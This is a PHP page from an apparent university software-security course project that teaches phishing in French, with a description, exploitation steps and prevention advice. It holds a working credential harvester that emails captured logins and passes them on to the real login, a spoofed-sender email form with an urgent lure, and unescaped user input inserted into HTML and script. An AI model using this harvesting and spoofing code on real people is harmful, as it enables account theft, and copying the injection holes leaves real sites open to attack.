<?php
/*****************************************************
 * phishing.php                                      *
 *                                                   *
 * Project : Session project                         *
 * Course : GLO-7009 - Software security             *
 * Team : Team 2                                     *
 * Session : Winter 2024                             *
 * University : Laval University                     *
 * Version : 1.0                                     *
 *****************************************************/

/*****************************************************
 *                       MODEL                       *
 *****************************************************/
require("model.php");

/*****************************************************
 *              PHISHING AUTHENTICATION              *
 *****************************************************/
if($_SERVER["REQUEST_METHOD"] == "POST") {
    $fail_redirect = $menu[2]["files"][1]["name"]."?view=demonstration";
    $message_vul = '<html>
    <body>
        <table>
            <tbody>
                <tr>
                    <td style="border: 1px solid black; padding: 0 0.5rem;">
                        Adresse courriel
                    </td>
                    <td style="border: 1px solid black; padding: 0 0.5rem;">
                        '.$_POST["emailv"].'
                    </td>
                </tr>
                <tr>
                    <td style="border: 1px solid black; padding: 0 0.5rem;">
                        Mot de passe
                    </td>
                    <td style="border: 1px solid black; padding: 0 0.5rem;">
                        '.$_POST["passwordv"].'
                    </td>
                </tr>
                '.(isset($_POST["persistentv"]) ? '
                <tr>
                    <td style="border: 1px solid black; padding: 0 0.5rem;">
                        Persistence
                    </td>
                    <td style="border: 1px solid black; padding: 0 0.5rem;">
                        '.$_POST["persistentv"].'
                    </td>
                </tr>
                ' : '').'
            </tbody>
        </table>
    </body>
</html>';
    $pattern_link = "/<a\s+[^>]*href=\"([^\"]*)\"[^>]*>/";
    if (isset($_POST["sendMail"])) {
        $error = array();

        if (empty($_POST["emailAttackName"])) {
            $error["emailAttackName"] = "Veuillez entrer un nom valide.";
        }

        if (!filter_var($_POST["emailAttack"], FILTER_VALIDATE_EMAIL)) {
            $error["emailAttack"] = "Veuillez entrer une adresse courriel valide.";
        }

        if (!filter_var($_POST["emailVict"], FILTER_VALIDATE_EMAIL)) {
            $error["emailVict"] = "Veuillez entrer une adresse courriel de transmission valide.";
        }

        if (empty($_POST["emailSubject"])) {
            $error["emailSubject"] = "Veuillez entrer un sujet valide.";
        }

        if (empty($_POST["emailMessage"])) {
            $error["emailMessage"] = "Veuillez entrer un message valide.";
        } else {
            $message = $_POST["emailMessage"];
            if (preg_match($pattern_link, $message, $resultMatch)) {
                $resultMatch = '<a href="'.$resultMatch[1].'&attackEmail='.$_POST["emailAttack"].'">';
                $message = preg_replace($pattern_link, $resultMatch, $message);
            }
        }

        if (!isset($error["emailAttackName"]) && !isset($error["emailAttack"]) && !isset($error["emailVict"]) &&
            !isset($error["emailSubject"]) && !isset($error["emailMessage"])) {
            if (sendmail($_POST["emailAttackName"], $_POST["emailAttack"], $_POST["emailVict"], $_POST["emailSubject"],
                $_POST["emailMessage"], $_POST["emailMessageType"], $fail_redirect)) {
                $success = true;
            }
        }
    } else if (isset($_POST["connect"])) {
        header("Location: ".$config["site_link"]."/".$menu[2]["folder"]."/".$menu[2]["files"][0]["name"].
            "?view=demonstration");
        exit();
    } else if (isset($_POST["connectVuln"])) {
        $error = array();

        if (!filter_var($_POST["emailv"], FILTER_VALIDATE_EMAIL)) {
            $error["email"] = "Veuillez entrer une adresse courriel valide.";
        }

        if (empty($_POST["passwordv"])) {
            $error["password"] = "Veuillez entrer un mot de passe valide.";
        }

        if (!isset($error["email"]) && !isset($error["passwordv"])) {
            if (sendmail("Phishing Result","Result", $config["site_mail"], "Résultat de l'attaque", $message_vul,
                "html", $fail_redirect)) {
                $email = $_POST["emailv"];
                $password = $_POST["passwordv"];
                $persistent = isset($_POST["persistentv"]);
                $add_code = '<script>
    window.addEventListener("DOMContentLoaded", () => {
        document.getElementById("formVulnTransmit")["email"].value="'.$email.'";
        document.getElementById("formVulnTransmit")["password"].value="'.$password.'";
        document.getElementById("formVulnTransmit")["persistent"].value="'.$persistent.'";
        if (("'.$email.'").toString() !== "" && ("'.$password.'").toString() !== "") {
            document.getElementById("formVulnTransmit").submit();
        }
    });
</script>';
            }
        }
    }
}

/*****************************************************
 *                      CONTENT                      *
 *****************************************************/
$presentation = '<div class="table">
    <div class="row split">
        <section>
            <h2>Catégorie</h2>
            <p>Vulnérabilités dans les mécanismes d’authentification</p>
        </section>
        <section>
            <h2>Impact potentiel</h2>
            <p>Confidentialité et intégrité</p>
        </section>
    </div>
    <section class="row">
        <h2>Description</h2>
        <p>L’authentification par phishing consiste à se faire passer pour une autorité dans le but de récupérer des
        informations sensibles. L’attaque peut prendre différentes formes, telles que les adresses courriels, les SMS,
        les publicités, etc. L’attaquant va tenter de créer un sentiment d’urgence chez la victime afin de la pousser à
        agir.</p>
    </section>
    <section class="row">
        <h2>Objectifs</h2>
        <ul class="list">
            <li>Contourner les mesures d’authentification.</li>
            <li>Voler des données sensibles ou confidentielles.</li>
        </ul>
    </section>
    <section class="row">
        <h2>Causes</h2>
        <ul class="list">
            <li>L’attaquant a accès aux adresses courriel.</li>
        </ul>
    </section>
    <section class="row">
        <h2>Exemples marquants</h2>
        <ul class="list">
            <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-28069" target="_blank">Dell Streaming Data Platform
            (CVE-2023-28069)</a><br />
                Une vulnérabilité dans la plateforme de flux continu des données de Dell a permis à un attaquant
                d’inciter un utilisateur légitime à cliquer sur un lien malicieux. Cet attaquant a pu réaliser son
                attaque sans être connecté sur la plateforme. Cette attaque est possible sur toutes les versions 1.4 et
                les précédentes.
            </li>
            <li><a href=" https://nvd.nist.gov/vuln/detail/CVE-2021-29432" target="_blank">Sydent (CVE-2021-29432)</a>
            <br />
                La compagnie Matrix est une compagnie qui œuvre pour un monde sécurisé de communication décentralisé et
                un réseau open-source. Une vulnérabilité dans leur serveur d’identité Sydent pouvait être utilisée pour
                transmettre des courriels arbitraires à toutes les adresses.
            </li>
        </ul>
    </section>
</div>';

$demonstration = '<div class="split">
    <form id="formVuln" method="POST">
        <div>
            <h2>Scénario</h2>
            '.((isset($error["token"])) ? '
            <div class="form-group">
                <div class="alert alert-danger">'.$error["token"] . '</div>
            </div>
            ' : '').'
            <div class="form-group">
                <label for="emailv">Adresse courriel</label>
                '.((isset($error["email"])) ? '<div class="alert alert-danger">'.$error["email"].'</div>' : '').'
                <input id="emailv" class="form-control'.((isset($error["email"])) ? ' invalid' : '').'" name="emailv"
                type="email"'.((isset($_POST["emailv"])) ? ' value="'.$_POST["emailv"].'"' : '').' />
            </div>
            <div class="form-group">
                <label for="passwordv">Mot de passe</label>
                '.((isset($error["password"])) ? '<div class="alert alert-danger">'.$error["password"].'</div>' : '').'
                <input id="passwordv" class="form-control'.((isset($error["password"])) ? ' invalid' : '').'"
                name="passwordv" type="password" />
            </div>
            <div class="form-group">
                <input id="persistentv" class="form-check" name="persistentv" type="checkbox"'.
                ((isset($_POST["persistentv"]) && $_POST["persistentv"]) ? ' checked' : '').' />
                <label for="persistentv">Se souvenir de moi</label>
            </div>
        </div>
        <footer>
            <button name="connectVuln" type="submit">Connexion</button>
        </footer>
    </form>
    <form method="POST">
        <div>
            <h2>Courriel</h2>
            '.((isset($success)) ? '
            <div class="form-group">
                <div class="alert alert-success">Le courriel a bien été envoyé.</div>
            </div>
            ' : '').'
            <div class="form-group">
                <label for="emailAttackName">Nom affiché</label>
                '.((isset($error["emailAttackName"])) ? '<div class="alert alert-danger">'.$error["emailAttackName"].
                '</div>' : '').'
                <input id="emailAttackName" class="form-control'.((isset($error["emailAttackName"])) ? ' invalid' : '').
                '" name="emailAttackName" type="text"'.((isset($_POST["emailAttackName"])) ? ' value="'.
                $_POST["emailAttackName"].'"' : '').' />
            </div>
            <div class="form-group">
                <label for="emailAttack">Adresse courriel affichée</label>
                '.((isset($error["emailAttack"])) ? '<div class="alert alert-danger">'.$error["emailAttack"].'</div>' :
                '').'
                <input id="emailAttack" class="form-control'.((isset($error["emailAttack"])) ? ' invalid' : '').'" name=
                "emailAttack" type="email"'.((isset($_POST["emailAttack"])) ? ' value="'.$_POST["emailAttack"].'"' : '').
                ' />
            </div>
            <div class="form-group">
                <label for="emailVict">Adresse courriel du destinataire</label>
                '.((isset($error["emailVict"]))?'<div class="alert alert-danger">'.$error["emailVict"].'</div>' : '').'
                <input id="emailVict" class="form-control'.((isset($error["emailVict"])) ? ' invalid' : '').'" name=
                "emailVict" type="email"'.((isset($_POST["emailVict"])) ? ' value="'.$_POST["emailVict"].'"' : '').' />
            </div>
            <div class="form-group">
                <label for="emailMessageType">Type du message</label>
                    <select id="emailMessageType" class="form-control" name="emailMessageType">
                        <option value="html">HTML</option>
                        <option value="raw"'.((isset($_POST["emailMessageType"]) && $_POST["emailMessageType"] == "raw")
                        ? ' selected' : '').'>Texte</option>
                    </select>
            </div>
            <div class="form-group">
                <label for="emailSubject">Sujet</label>
                '.((isset($error["emailSubject"]))?'<div class="alert alert-danger">'.$error["emailSubject"].'</div>' :
                '').'
                <input id="emailSubject" class="form-control'.((isset($error["emailSubject"])) ? ' invalid' : '').'"
                name="emailSubject" type="text" value="'.((isset($_POST["emailSubject"])) ? $_POST["emailSubject"] :
                'Ne perdez pas votre accès !').'" />
            </div>
            <div class="form-group">
                <label for="emailMessage">Message</label>
                '.((isset($error["emailMessage"]))?'<div class="alert alert-danger">'.$error["emailMessage"].'</div>' :
                '').'
                <textarea id="emailMessage" class="form-control'.((isset($error["emailMessage"])) ? ' invalid' : '').'"
                name="emailMessage" contenteditable="false">'.((isset($_POST["emailMessage"])) ?
                htmlspecialchars_decode($_POST["emailMessage"], ENT_QUOTES) : '<html>
    <body>
        <p>
            Bonjour cher utilisateur,<br />
            Nous avons constaté que vous n’avez pas utilisé votre compte depuis les dernières 24 heures.<br />
            Si vous ne cliquer pas <a href="'.$config["site_link"]."/".$menu[2]["folder"]."/".
            $menu[2]["files"][1]["name"]."?view=demonstration".'">sur ce lien</a> avant les prochaines 24 heures, '.
            'votre compte sera supprimé.
        </p>
    </body>
</html>').'</textarea>
            </div>
        </div>
        <footer>
            <button name="sendMail" type="submit">Envoyer</button>
        </footer>
    </form>
    <form id="formVulnTransmit" method="POST" action="'.$config["site_link"]."/".$menu[2]["folder"]."/".
    $menu[2]["files"][0]["name"].'?view=demonstration" hidden>
        <div>
            <div class="form-group">
                <input id="email" class="form-control" name="email" type="email"'.((isset($email)) ? ' value="'.$email.'"' : '').' />
            </div>
            <div class="form-group">
                <input id="password" class="form-control" name="password" type="password"'.((isset($password)) ? ' value="'.$password.'"' : '').' />
            </div>
            <div class="form-group">
                <input id="persistent" class="form-check" name="persistent" type="checkbox"'.((isset($persistent) && $persistent) ? ' checked' : '').' />
            </div>
            <div class="form-group">
                <input name="connect" type="text" />
            </div>
        </div>
    </form>
</div>'.((isset($add_code)) ? $add_code : '');

$exploit = '<div>
    <section>
        <h2>Conditions préalables pour l’exploitation</h2>
        <ul class="list">
            <li>L’attaquant détient une liste d’adresses courriels.</li>
            <li>L’attaquant a extrait la page de connexion du site web.</li>
        </ul>
    </section>
    <section>
        <h2>Méthodes d’exploitation</h2>
        <ul class="list">
            <li>Envoyer un lien malicieux par courriel.</li>
            <li>Envoyer un lien malicieux par SMS.</li>
        </ul>
    </section>
    <section>
        <h2>Exécution de l’attaque</h2>
        <ul class="list">
            <li>Concevoir un site malicieux imitant le site cible.</li>
            <li>Transmettre le lien aux victimes.</li>
            <li>Patienter jusqu’à ce qu’au moins une victime clique sur le lien.</li>
            <li>Récupérer les informations de connexion.</li>
            <li>Rediriger la victime vers le site cible.</li>
        </ul>
    </section>
    <section>
        <h2>Analyse d’un scénario vulnérable</h2>
        <p>Pour expliquer cette attaque, nous allons parcourir les démarches d’exploitation étape par étape.</p>
        <p>Premièrement, l’attaquant commence par récupérer la page de connexion d’un site cible et modifier la
        structure pour s’envoyer un courriel détenant les informations de connexion.</p>
        <p>Deuxièmement, l’attaquant va créer un courriel qui imite l’autorité afin de viser un groupe de victimes avec
        des adresses courriels qu’il aurait récupérées précédemment. Lorsqu’il a terminé de rédiger son courriel,
        l’attaquant va le transmettre au groupe et attendre une action de leur part. Les utilisateurs qui ne se méfient
        pas seront piégés, car ils fourniront leurs informations d’identifications.</p>
        <p>Enfin, l’attaque se termine lorsque l’attaquant utilise les informations des utilisateurs à leur insu.</p>
    </section>
</div>';

$fix = '<div>
    <section>
        <h2>Mesures de prévention</h2>
        <p>On peut se prémunir de cette attaque en mettant en place différentes mesures :</p>
        <ul class="list">
            <li><strong>Vérifier la provenance des courriels</strong><br />
                Les utilisateurs peuvent vérifier la provenance des courriels qu’ils reçoivent en regardant le nom
                inscrit dans ces courriels. Si toutefois celui-ci ne permet pas de distinguer le vrai courriel de celui
                de l’attaquant, il faudra regarder la source du message. De plus, les courriels malveillants en
                provenance de l’attaquant contiennent souvent des termes génériques ou des fautes d’orthographes
                d’usage. Les pistes mentionnées précédemment devraient accroître la vigilance concernant la provenance
                des courriels frauduleux.
            </li>
            <li><strong>Vérifier la provenance du lien</strong><br />
                Le lien ne devrait pas déformer le nom du site. Si ce dernier correspond au nom de domaine du site visé,
                il est peu probable qu’il s’agisse d’une attaque. Dans le cas contraire, les utilisateurs devraient s’en
                méfier.
            </li>
            <li><strong>Éviter de cliquer sur des liens</strong><br />
                Les utilisateurs devraient se méfier des liens et de la nature du message provenant de courriels non
                sollicités, dont particulièrement ceux qui poussent à agir dans l’urgence. Les utilisateurs vigilants
                sont plus enclins à vérifier l’authenticité d’un message.
            </li>
        </ul>
    </section>
</div>';

/*****************************************************
 *                    RENDER PAGE                    *
 *****************************************************/
echo render_malicious("Authentification par phishing", $presentation, $demonstration, $exploit, $fix);
